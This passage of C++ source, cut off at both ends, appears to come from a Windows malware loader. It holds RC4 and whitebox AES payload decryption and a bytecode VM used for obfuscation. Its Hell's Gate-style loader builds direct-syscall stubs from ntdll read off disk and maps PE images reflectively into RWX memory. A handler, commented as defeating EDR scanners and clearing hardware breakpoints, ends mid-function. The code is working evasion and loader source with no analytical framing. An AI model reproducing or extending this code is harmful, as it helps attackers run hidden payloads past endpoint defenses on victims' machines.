    for (int i = 0; i < 256; i++) { j = (j + S[i] + lk[i]) % 256; std::swap(S[i], S[j]); }
    int di = 0, dj = 0;
    for (int n = 0; n < 3072; n++) {
        di = (di + 1) % 256; dj = (dj + S[di]) % 256;
        std::swap(S[di], S[dj]);
    }
    volatile unsigned char* vlk = lk;
    for (int i = 0; i < 256; i++) vlk[i] = 0;
}
void RC4_Crypt(SecureVector& data, const unsigned char* key, size_t keyLen, bool corruptKey) {
    unsigned char S[256];
    RC4_KSA(S, key, keyLen, corruptKey);
    int i = 0, j = 0;
    for (size_t n = 0; n < data.size(); n++) {
        i = (i + 1) % 256; j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
    volatile unsigned char* vs = S;
    for (int k = 0; k < 256; k++) vs[k] = 0;
}
void DeriveRC4Key(const unsigned char* machineKey, size_t mkLen,
                  const unsigned char* salt, size_t saltLen,
                  unsigned char* outKey, size_t outLen) {
    for (size_t i = 0; i < outLen; i++) {
        unsigned int h = 5381;
        for (size_t j = 0; j < mkLen; j++)
            h = ((h << 5) + h) + machineKey[j];
        for (size_t j = 0; j < saltLen; j++)
            h = ((h << 5) + h) + salt[j] + (unsigned int)i;
        outKey[i] = (unsigned char)(h & 0xFF);
    }
}
namespace WhiteboxCipher {
    static const unsigned char SBOX[256] = {
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
    };
    static unsigned char gf_mul(unsigned char a, unsigned char b) {
        unsigned char p = 0;
        for (int i = 0; i < 8; i++) {
            if (b & 1) p ^= a;
            unsigned char hi = a & 0x80;
            a = (a << 1) & 0xFF;
            if (hi) a ^= 0x1B;
            b >>= 1;
        }
        return p;
    }
    static unsigned char xtime(unsigned char a) {
        return (a & 0x80) ? ((a << 1) ^ 0x1B) & 0xFF : (a << 1) & 0xFF;
    }
    static void GenTBoxes(const unsigned char* masterKey, unsigned char tboxes[10][16][256]) {
        unsigned char rk[11][16];
        memcpy(rk[0], masterKey, 16);
        unsigned char rcon = 1;
        for (int r = 1; r <= 10; r++) {
            unsigned char t0 = SBOX[rk[r-1][13]];
            unsigned char t1 = SBOX[rk[r-1][14]];
            unsigned char t2 = SBOX[rk[r-1][15]];
            unsigned char t3 = SBOX[rk[r-1][12]];
            rk[r][0] = rk[r-1][0] ^ t0 ^ rcon;
            rk[r][1] = rk[r-1][1] ^ t1;
            rk[r][2] = rk[r-1][2] ^ t2;
            rk[r][3] = rk[r-1][3] ^ t3;
            for (int i = 4; i < 16; i++) rk[r][i] = rk[r-1][i] ^ rk[r][i-4];
            rcon = gf_mul(rcon, 2);
        }
        for (int r = 0; r < 10; r++)
            for (int pos = 0; pos < 16; pos++)
                for (int v = 0; v < 256; v++)
                    tboxes[r][pos][v] = SBOX[v] ^ rk[r][pos];
    }
    static void ShiftRows(unsigned char* s) {
        unsigned char t[16] = {
            s[0], s[5], s[10], s[15], s[4], s[9], s[14], s[3],
            s[8], s[13], s[2],  s[7], s[12], s[1], s[6],  s[11]
        };
        memcpy(s, t, 16);
    }
    static void MixColumns(unsigned char* s) {
        for (int i = 0; i < 4; i++) {
            unsigned char* c = s + i * 4;
            unsigned char a0 = c[0], a1 = c[1], a2 = c[2], a3 = c[3];
            c[0] = xtime(a0) ^ xtime(a1) ^ a1 ^ a2 ^ a3;
            c[1] = a0 ^ xtime(a1) ^ xtime(a2) ^ a2 ^ a3;
            c[2] = a0 ^ a1 ^ xtime(a2) ^ xtime(a3) ^ a3;
            c[3] = xtime(a0) ^ a0 ^ a1 ^ a2 ^ xtime(a3);
        }
    }
    void EncryptBlock(const unsigned char* input, unsigned char* output, unsigned char tboxes[10][16][256]) {
        unsigned char state[16];
        memcpy(state, input, 16);
        for (int r = 0; r < 10; r++) {
            for (int p = 0; p < 16; p++) state[p] = tboxes[r][p][state[p]];
            ShiftRows(state);
            if (r < 9) MixColumns(state);
        }
        memcpy(output, state, 16);
    }
    void DecryptCTR(unsigned char* data, size_t len, const unsigned char* masterKey, const unsigned char* nonce) {
        static unsigned char tboxes[10][16][256];
        GenTBoxes(masterKey, tboxes);
        unsigned char counter[16];
        memcpy(counter, nonce, 16);
        unsigned char ecount[16];
        for (size_t i = 0; i < len; i += 16) {
            EncryptBlock(counter, ecount, tboxes);
            size_t cpLen = (i + 16 <= len) ? 16 : len - i;
            for (size_t j = 0; j < cpLen; j++) data[i + j] ^= ecount[j];
            for (int j = 15; j >= 0; j--) {
                if (++counter[j] != 0) break;
            }
        }
        volatile unsigned char* vt = (volatile unsigned char*)tboxes;
        for (size_t i = 0; i < sizeof(tboxes); i++) vt[i] = 0;
        volatile unsigned char* vc = counter;
        volatile unsigned char* ec = ecount;
        for (int j = 0; j < 16; j++) { vc[j] = 0; ec[j] = 0; }
    }
}
namespace NixonVM {
    enum Op : uint8_t {
        OP_MOV=0, OP_ADD=1, OP_XOR=2, OP_JMP=3, OP_CMP=4,
        OP_PUSH=5, OP_POP=6, OP_CALL=7, OP_RET=8, OP_LOAD=9,
        OP_STORE=10, OP_SHL=11, OP_SHR=12, OP_AND=13, OP_OR=14, OP_HALT=15
    };
    struct VMState {
        uint32_t regs[16];
        uint8_t  memory[4096];
        uint32_t stack[256];
        int sp, pc;
        bool halted;
        bool flag_zero, flag_less;
    };
    void Execute(VMState& vm, const uint8_t* bc, size_t bcLen, const uint8_t* opcodeMap, int maxSteps) {
        uint8_t inverseMap[256];
        memset(inverseMap, 0xFF, 256);
        for (int i = 0; i < 16; i++) inverseMap[opcodeMap[i]] = (uint8_t)i;
        vm.pc = 0; vm.sp = 0; vm.halted = false;
        int steps = 0;
#ifdef __GNUC__
        static const void* dispatch[] = {
            &&lbl_mov, &&lbl_add, &&lbl_xor, &&lbl_jmp, &&lbl_cmp,
            &&lbl_push, &&lbl_pop, &&lbl_call, &&lbl_ret, &&lbl_load,
            &&lbl_store, &&lbl_shl, &&lbl_shr, &&lbl_and, &&lbl_or, &&lbl_halt
        };
        #define CHECK_OPERANDS(n) do { if (vm.pc + (n) > (int)bcLen) { vm.halted = true; return; } } while(0)
        #define DISPATCH() do { \
            if (vm.halted || vm.pc >= (int)bcLen || ++steps > maxSteps) return; \
            uint8_t raw = bc[vm.pc]; uint8_t op = inverseMap[raw]; \
            if (op > 15) return; vm.pc++; goto *dispatch[op]; \
        } while(0)
        DISPATCH();
        lbl_mov: {
            CHECK_OPERANDS(3);
            uint8_t dst = bc[vm.pc] & 0x0F; uint16_t val = (bc[vm.pc+1]<<8)|bc[vm.pc+2];
            vm.regs[dst] = val; vm.pc += 3; DISPATCH();
        }
        lbl_add: {
            CHECK_OPERANDS(2);
            uint8_t dst = bc[vm.pc] & 0x0F, src = bc[vm.pc+1] & 0x0F;
            vm.regs[dst] = (vm.regs[dst] + vm.regs[src]) & 0xFFFFFFFF;
            vm.pc += 2; DISPATCH();
        }
        lbl_xor: {
            CHECK_OPERANDS(2);
            uint8_t dst = bc[vm.pc] & 0x0F, src = bc[vm.pc+1] & 0x0F;
            vm.regs[dst] ^= vm.regs[src]; vm.pc += 2; DISPATCH();
        }
        lbl_jmp: {
            CHECK_OPERANDS(2);
            uint16_t target = (bc[vm.pc]<<8)|bc[vm.pc+1];
            vm.pc = target; DISPATCH();
        }
        lbl_cmp: {
            uint8_t a = bc[vm.pc] & 0x0F, b = bc[vm.pc+1] & 0x0F;
            vm.flag_zero = (vm.regs[a] == vm.regs[b]);
            vm.flag_less = (vm.regs[a] < vm.regs[b]);
            vm.pc += 2; DISPATCH();
        }
        lbl_push: {
            uint8_t src = bc[vm.pc] & 0x0F;
            if (vm.sp < 256) vm.stack[vm.sp++] = vm.regs[src];
            vm.pc += 1; DISPATCH();
        }
        lbl_pop: {
            uint8_t dst = bc[vm.pc] & 0x0F;
            vm.regs[dst] = (vm.sp > 0) ? vm.stack[--vm.sp] : 0;
            vm.pc += 1; DISPATCH();
        }
        lbl_call: {
            uint16_t target = (bc[vm.pc]<<8)|bc[vm.pc+1];
            if (vm.sp < 256) vm.stack[vm.sp++] = vm.pc + 2;
            vm.pc = target; DISPATCH();
        }
        lbl_ret: {
            vm.pc = (vm.sp > 0) ? vm.stack[--vm.sp] : (int)bcLen;
            DISPATCH();
        }
        lbl_load: {
            uint8_t dst = bc[vm.pc] & 0x0F; uint16_t addr = (bc[vm.pc+1]<<8)|bc[vm.pc+2];
            vm.regs[dst] = (addr < 4096) ? vm.memory[addr] : 0;
            vm.pc += 3; DISPATCH();
        }
        lbl_store: {
            uint16_t addr = (bc[vm.pc]<<8)|bc[vm.pc+1]; uint8_t src = bc[vm.pc+2] & 0x0F;
            if (addr < 4096) vm.memory[addr] = vm.regs[src] & 0xFF;
            vm.pc += 3; DISPATCH();
        }
        lbl_shl: {
            uint8_t dst = bc[vm.pc] & 0x0F, amt = bc[vm.pc+1];
            vm.regs[dst] <<= (amt & 31); vm.pc += 2; DISPATCH();
        }
        lbl_shr: {
            uint8_t dst = bc[vm.pc] & 0x0F, amt = bc[vm.pc+1];
            vm.regs[dst] >>= (amt & 31); vm.pc += 2; DISPATCH();
        }
        lbl_and: {
            uint8_t dst = bc[vm.pc] & 0x0F, src = bc[vm.pc+1] & 0x0F;
            vm.regs[dst] &= vm.regs[src]; vm.pc += 2; DISPATCH();
        }
        lbl_or: {
            uint8_t dst = bc[vm.pc] & 0x0F, src = bc[vm.pc+1] & 0x0F;
            vm.regs[dst] |= vm.regs[src]; vm.pc += 2; DISPATCH();
        }
        lbl_halt:
            vm.halted = true; return;
#else
        while (!vm.halted && vm.pc < (int)bcLen && steps < maxSteps) {
            uint8_t raw = bc[vm.pc]; uint8_t op = inverseMap[raw]; vm.pc++; steps++;
            switch(op) {
                case 0: { uint8_t d=bc[vm.pc]&0x0F; uint16_t v=(bc[vm.pc+1]<<8)|bc[vm.pc+2]; vm.regs[d]=v; vm.pc+=3; break; }
                case 1: { uint8_t d=bc[vm.pc]&0x0F,s=bc[vm.pc+1]&0x0F; vm.regs[d]=(vm.regs[d]+vm.regs[s])&0xFFFFFFFF; vm.pc+=2; break; }
                case 2: { uint8_t d=bc[vm.pc]&0x0F,s=bc[vm.pc+1]&0x0F; vm.regs[d]^=vm.regs[s]; vm.pc+=2; break; }
                case 3: { vm.pc=(bc[vm.pc]<<8)|bc[vm.pc+1]; break; }
                case 4: { uint8_t a=bc[vm.pc]&0x0F,b=bc[vm.pc+1]&0x0F; vm.flag_zero=(vm.regs[a]==vm.regs[b]); vm.flag_less=(vm.regs[a]<vm.regs[b]); vm.pc+=2; break; }
                case 5: { uint8_t s=bc[vm.pc]&0x0F; if(vm.sp<256) vm.stack[vm.sp++]=vm.regs[s]; vm.pc+=1; break; }
                case 6: { uint8_t d=bc[vm.pc]&0x0F; vm.regs[d]=(vm.sp>0)?vm.stack[--vm.sp]:0; vm.pc+=1; break; }
                case 7: { uint16_t t=(bc[vm.pc]<<8)|bc[vm.pc+1]; if(vm.sp<256) vm.stack[vm.sp++]=vm.pc+2; vm.pc=t; break; }
                case 8: { vm.pc=(vm.sp>0)?vm.stack[--vm.sp]:(int)bcLen; break; }
                case 9: { uint8_t d=bc[vm.pc]&0x0F; uint16_t a=(bc[vm.pc+1]<<8)|bc[vm.pc+2]; vm.regs[d]=(a<4096)?vm.memory[a]:0; vm.pc+=3; break; }
                case 10:{ uint16_t a=(bc[vm.pc]<<8)|bc[vm.pc+1]; uint8_t s=bc[vm.pc+2]&0x0F; if(a<4096) vm.memory[a]=vm.regs[s]&0xFF; vm.pc+=3; break; }
                case 11:{ uint8_t d=bc[vm.pc]&0x0F,a=bc[vm.pc+1]; vm.regs[d]<<=(a&31); vm.pc+=2; break; }
                case 12:{ uint8_t d=bc[vm.pc]&0x0F,a=bc[vm.pc+1]; vm.regs[d]>>=(a&31); vm.pc+=2; break; }
                case 13:{ uint8_t d=bc[vm.pc]&0x0F,s=bc[vm.pc+1]&0x0F; vm.regs[d]&=vm.regs[s]; vm.pc+=2; break; }
                case 14:{ uint8_t d=bc[vm.pc]&0x0F,s=bc[vm.pc+1]&0x0F; vm.regs[d]|=vm.regs[s]; vm.pc+=2; break; }
                case 15: vm.halted=true; return;
                default: return;
            }
        }
#endif
    }
}
namespace ReflectiveLoader {
    struct HellsGate {
        PVOID stubPage;
        size_t stubOffset;
        uintptr_t syscallGadget; 
        struct SyscallEntry { DWORD hash; DWORD number; size_t stubOff; };
        SyscallEntry entries[64];
        int count;
    };
    bool InitHellsGate(HellsGate& hg) {
        hg.count = 0; hg.stubOffset = 0; hg.syscallGadget = 0;
        PVOID pNtdll = GetModuleBase(0x1EDAB0ED);
        if (!pNtdll) return false;
        PIMAGE_DOS_HEADER pDosLive = (PIMAGE_DOS_HEADER)pNtdll;
        PIMAGE_NT_HEADERS pNtLive = (PIMAGE_NT_HEADERS)((PUCHAR)pNtdll + pDosLive->e_lfanew);
        PIMAGE_SECTION_HEADER secLive = IMAGE_FIRST_SECTION(pNtLive);
        for (int si = 0; si < pNtLive->FileHeader.NumberOfSections; si++) {
            if (secLive[si].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                PUCHAR base = (PUCHAR)pNtdll + secLive[si].VirtualAddress;
                DWORD sz = secLive[si].Misc.VirtualSize;
                for (DWORD off = 0; off + 2 < sz; off++) {
                    if (base[off] == 0x0F && base[off+1] == 0x05 && base[off+2] == 0xC3) {
                        hg.syscallGadget = (uintptr_t)(base + off);
                        break;
                    }
                }
                if (hg.syscallGadget) break;
            }
        }
        typedef HANDLE(WINAPI* fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
        typedef DWORD(WINAPI* fnGetFileSize)(HANDLE, LPDWORD);
        typedef BOOL(WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
        PVOID pKernel32 = GetModuleBase(0x6DDB9555);
        fnCreateFileA pCreateFileA = pKernel32 ? (fnCreateFileA)GetExportAddress(pKernel32, HashFNV1a("CreateFileA")) : NULL;
        fnGetFileSize pGetFileSize = pKernel32 ? (fnGetFileSize)GetExportAddress(pKernel32, HashFNV1a("GetFileSize")) : NULL;
        fnReadFile pReadFile = pKernel32 ? (fnReadFile)GetExportAddress(pKernel32, HashFNV1a("ReadFile")) : NULL;
        if (!pCreateFileA || !pGetFileSize || !pReadFile) return false;
        HANDLE hFile = pCreateFileA(OBF("C:\\Windows\\System32\\ntdll.dll"),
            GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        DWORD fileSize = pGetFileSize(hFile, NULL);
        SecureVector diskNtdll(fileSize);
        DWORD bytesRead;
        pReadFile(hFile, diskNtdll.data(), fileSize, &bytesRead, NULL);
        if (g_api.pCloseHandle) g_api.pCloseHandle(hFile);
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)diskNtdll.data();
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(diskNtdll.data() + pDos->e_lfanew);
        DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pNt);
        auto rva2raw = [&](DWORD rva) -> DWORD {
            for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
                if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize)
                    return rva - sections[i].VirtualAddress + sections[i].PointerToRawData;
            return 0;
        };
        DWORD expRaw = rva2raw(expRVA);
        if (!expRaw) return false;
        PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(diskNtdll.data() + expRaw);
        DWORD nNames = pExp->NumberOfNames;
        PDWORD pNames = (PDWORD)(diskNtdll.data() + rva2raw(pExp->AddressOfNames));
        PDWORD pFuncs = (PDWORD)(diskNtdll.data() + rva2raw(pExp->AddressOfFunctions));
        PWORD  pOrds  = (PWORD)(diskNtdll.data() + rva2raw(pExp->AddressOfNameOrdinals));
        hg.stubPage = g_api.pVirtualAlloc ? g_api.pVirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : NULL;
        if (!hg.stubPage) return false;
        for (DWORD i = 0; i < nNames && hg.count < 64; i++) {
            if (hg.stubOffset + 11 > 4096) break; 
            DWORD nameRaw = rva2raw(pNames[i]);
            char* fnName = (char*)(diskNtdll.data() + nameRaw);
            if (fnName[0] != 'N' || fnName[1] != 't') continue;
            DWORD funcRaw = rva2raw(pFuncs[pOrds[i]]);
            unsigned char* funcBytes = diskNtdll.data() + funcRaw;
            DWORD sysNum = 0;
            if (funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 && funcBytes[3] == 0xB8) {
                sysNum = *(DWORD*)(funcBytes + 4);
            } else if (funcBytes[0] == 0xE9 || funcBytes[0] == 0xE0) {
                for (int m = 1; m <= 500; m++) {
                    if (funcBytes + m * 32 < diskNtdll.data() + fileSize && funcBytes[m * 32] == 0x4C && funcBytes[m * 32 + 1] == 0x8B && funcBytes[m * 32 + 2] == 0xD1 && funcBytes[m * 32 + 3] == 0xB8) {
                        sysNum = *(DWORD*)(funcBytes + m * 32 + 4) - m;
                        break;
                    }
                    if (funcBytes - m * 32 >= diskNtdll.data() && funcBytes[-(m * 32)] == 0x4C && funcBytes[-(m * 32) + 1] == 0x8B && funcBytes[-(m * 32) + 2] == 0xD1 && funcBytes[-(m * 32) + 3] == 0xB8) {
                        sysNum = *(DWORD*)(funcBytes - m * 32 + 4) + m;
                        break;
                    }
                }
            }
            if (sysNum != 0) {
                if (hg.syscallGadget && hg.stubOffset + 38 <= 4096) {
                    unsigned char stub[38];
                    int idx = 0;
                    stub[idx++] = 0x41; stub[idx++] = 0x58; 
                    stub[idx++] = 0x48; stub[idx++] = 0xB8; *(uintptr_t*)(stub+idx) = hg.syscallGadget + 0x14; idx+=8; 
                    stub[idx++] = 0x50; 
                    stub[idx++] = 0x41; stub[idx++] = 0x50; 
                    stub[idx++] = 0x4C; stub[idx++] = 0x8B; stub[idx++] = 0xD1; 
                    stub[idx++] = 0xB8; memcpy(stub + idx, &sysNum, 4); idx += 4; 
                    stub[idx++] = 0xFF; stub[idx++] = 0x25; *(DWORD*)(stub+idx) = 0; idx += 4; 
                    *(uintptr_t*)(stub + idx) = hg.syscallGadget; idx += 8;
                    memcpy((unsigned char*)hg.stubPage + hg.stubOffset, stub, idx);
                    hg.entries[hg.count].hash = HashFNV1a(fnName);
                    hg.entries[hg.count].number = sysNum;
                    hg.entries[hg.count].stubOff = hg.stubOffset;
                    hg.count++;
                    hg.stubOffset += idx;
                }
            }
        }
        return true;
    }
    PVOID GetSyscallStub(HellsGate& hg, DWORD fnHash) {
        for (int i = 0; i < hg.count; i++)
            if (hg.entries[i].hash == fnHash)
                return (PVOID)((unsigned char*)hg.stubPage + hg.entries[i].stubOff);
        return nullptr;
    }
    typedef NTSTATUS(NTAPI* fnNtAllocVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    PVOID LoadPEFromMemory(HellsGate& hg, const unsigned char* peData, size_t peSize) {
        if (peSize < 0x40) return nullptr;
        DWORD eLfanew = *(DWORD*)(peData + 0x3C);
        WORD magic = *(WORD*)(peData + eLfanew + 24);
        if (magic != 0x20B) return nullptr;
        DWORD szImage = *(DWORD*)(peData + eLfanew + 24 + 56);
        DWORD entryRVA = *(DWORD*)(peData + eLfanew + 24 + 16);
        PVOID baseAddr = nullptr;
        SIZE_T regionSize = szImage;
        fnNtAllocVM pAlloc = (fnNtAllocVM)GetSyscallStub(hg, 0x4C0A09AE);
        if (pAlloc) {
            pAlloc((HANDLE)-1, &baseAddr, 0, &regionSize, 0x3000, 0x40);
        } else {
            baseAddr = g_api.pVirtualAlloc ? g_api.pVirtualAlloc(NULL, szImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) : NULL;
        }
        if (!baseAddr) return nullptr;
        DWORD szHeaders = *(DWORD*)(peData + eLfanew + 24 + 60);
        memcpy(baseAddr, peData, szHeaders);
        WORD nSections = *(WORD*)(peData + eLfanew + 6);
        WORD optHdrSize = *(WORD*)(peData + eLfanew + 20);
        DWORD sectOff = eLfanew + 24 + optHdrSize;
        for (int i = 0; i < nSections; i++) {
            DWORD off = sectOff + i * 40;
            DWORD va = *(DWORD*)(peData + off + 12);
            DWORD rawSz = *(DWORD*)(peData + off + 16);
            DWORD rawPtr = *(DWORD*)(peData + off + 20);
            if (rawSz > 0) memcpy((unsigned char*)baseAddr + va, peData + rawPtr, rawSz);
        }
        DWORD prefBase64Lo = *(DWORD*)(peData + eLfanew + 24 + 24);
        DWORD prefBase64Hi = *(DWORD*)(peData + eLfanew + 24 + 28);
        uintptr_t preferredBase = ((uintptr_t)prefBase64Hi << 32) | prefBase64Lo;
        intptr_t delta = (uintptr_t)baseAddr - preferredBase;
        if (delta != 0) {
            DWORD relocRVA = *(DWORD*)(peData + eLfanew + 24 + 136);
            DWORD relocSize = *(DWORD*)(peData + eLfanew + 24 + 140);
            if (relocRVA && relocSize) {
                PUCHAR relocBase = (PUCHAR)baseAddr + relocRVA;
                DWORD processed = 0;
                while (processed < relocSize) {
                    DWORD blockRVA = *(DWORD*)(relocBase + processed);
                    DWORD blockSz = *(DWORD*)(relocBase + processed + 4);
                    if (blockSz == 0) break;
                    DWORD nEntries = (blockSz - 8) / 2;
                    PWORD entries = (PWORD)(relocBase + processed + 8);
                    for (DWORD e = 0; e < nEntries; e++) {
                        WORD entry = entries[e];
                        BYTE type = (entry >> 12) & 0xF;
                        WORD offset = entry & 0xFFF;
                        if (type == 10) { 
                            uintptr_t* patch = (uintptr_t*)((PUCHAR)baseAddr + blockRVA + offset);
                            *patch += delta;
                        } else if (type == 3) { 
                            DWORD* patch = (DWORD*)((PUCHAR)baseAddr + blockRVA + offset);
                            *patch += (DWORD)delta;
                        }
                    }
                    processed += blockSz;
                }
            }
        }
        PIMAGE_NT_HEADERS pNtPE = (PIMAGE_NT_HEADERS)((PUCHAR)baseAddr + eLfanew);
        DWORD impRVA = pNtPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (impRVA) {
            PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)((PUCHAR)baseAddr + impRVA);
            typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
            typedef FARPROC(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
            PVOID pKernel32 = GetModuleBase(0x6DDB9555);
            fnLoadLibraryA pLoadLib = (fnLoadLibraryA)GetExportAddress(pKernel32, HashFNV1a("LoadLibraryA"));
            fnGetProcAddress pGetProc = (fnGetProcAddress)GetExportAddress(pKernel32, HashFNV1a("GetProcAddress"));
            if (pLoadLib && pGetProc) {
                while (pImp->Name) {
                    char* dllName = (char*)((PUCHAR)baseAddr + pImp->Name);
                    HMODULE hMod = pLoadLib(dllName);
                    if (hMod) {
                        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUCHAR)baseAddr + pImp->OriginalFirstThunk);
                        PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)((PUCHAR)baseAddr + pImp->FirstThunk);
                        if (!thunk) thunk = iat;
                        while (thunk->u1.AddressOfData) {
                            FARPROC resolved = nullptr;
                            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                                resolved = pGetProc(hMod, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                            } else {
                                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((PUCHAR)baseAddr + thunk->u1.AddressOfData);
                                resolved = pGetProc(hMod, pName->Name);
                            }
                            iat->u1.Function = (uintptr_t)resolved;
                            // IAT ground-truth snapshot: record (slot -> resolved)
                            // so VerifyIAT() can detect post-load IAT hooking.
                            // Slots array is fixed-size; excess slots are still
                            // resolved but not tracked (fail-open on count only).
                            if (resolved && g_iatTracked < NIXON_IAT_SLOTS) {
                                g_iatSlots[g_iatTracked] = (uintptr_t)&iat->u1.Function;
                                g_iatTruth[g_iatTracked] = (uintptr_t)resolved;
                                g_iatTracked++;
                            }
                            thunk++;
                            iat++;
                        }
                    } else {
                        if (g_api.pVirtualFree) g_api.pVirtualFree(baseAddr, 0, MEM_RELEASE);
                        return nullptr;
                    }
                    pImp++;
                }
            } else {
                if (g_api.pVirtualFree) g_api.pVirtualFree(baseAddr, 0, MEM_RELEASE);
                return nullptr;
            }
        }
        return (unsigned char*)baseAddr + entryRVA;
    }
}
namespace SecureEnclave {
    struct ProtectedBuffer {
        unsigned char* data;
        size_t size;
        bool locked;
    };
    ProtectedBuffer Allocate(size_t size) {
        ProtectedBuffer buf;
        buf.data = (unsigned char*)(g_api.pVirtualAlloc ? g_api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) : NULL);
        buf.size = size;
        buf.locked = false;
        if (buf.data && g_api.pVirtualLock) g_api.pVirtualLock(buf.data, size);
        return buf;
    }
    void SecureWipe(ProtectedBuffer& buf) {
        if (buf.data) {
            volatile unsigned char* p = (volatile unsigned char*)buf.data;
            for (size_t i = 0; i < buf.size; i++) p[i] = 0;
            if (g_api.pVirtualUnlock) g_api.pVirtualUnlock(buf.data, buf.size);
            if (g_api.pVirtualFree) g_api.pVirtualFree(buf.data, 0, MEM_RELEASE);
            buf.data = nullptr;
            buf.size = 0;
        }
    }
    void Lock(ProtectedBuffer& buf) {
        if (buf.data && !buf.locked) {
            DWORD old;
            if (g_api.pVirtualProtect) g_api.pVirtualProtect(buf.data, buf.size, PAGE_NOACCESS, &old);
            buf.locked = true;
        }
    }
    void Unlock(ProtectedBuffer& buf) {
        if (buf.data && buf.locked) {
            DWORD old;
            if (g_api.pVirtualProtect) g_api.pVirtualProtect(buf.data, buf.size, PAGE_READWRITE, &old);
            buf.locked = false;
        }
    }
}
bool DecodeStringArray(const char** encodedArray, size_t numItems, SecureVector& out) {
    out.reserve(numItems);
    for (size_t i = 0; i < numItems; ++i) {
        bool found = false;
        for (int v = 0; v < 256; ++v) {
            int j = 0;
            while (encodedArray[i][j] && NIXON_DICT[v][j] && encodedArray[i][j] == NIXON_DICT[v][j]) j++;
            if (encodedArray[i][j] == '\0' && NIXON_DICT[v][j] == '\0') {
                out.push_back((unsigned char)v);
                found = true;
                break;
            }
        }
        if (!found) return false;
    }
    return true;
}

// ============================================================
// BUG-22 FIX / ENHANCEMENT: Vectored Exception Handling (VEH)
// Anti-Dump / Hardware Breakpoint neutralization
// ============================================================
LONG WINAPI NixonVEHHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {
        // A scanner or EDR tried to read our guarded memory
        // We catch it, manipulate context if needed, or silently continue
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Anti-Debugging: clear hardware breakpoints (DR0-DR3)
        pExceptionInfo->ContextRecord->Dr0 = 0;
        pExceptionInfo->ContextRecord->Dr1 = 0;
        pExceptionInfo->ContextRecord->Dr2 = 0;
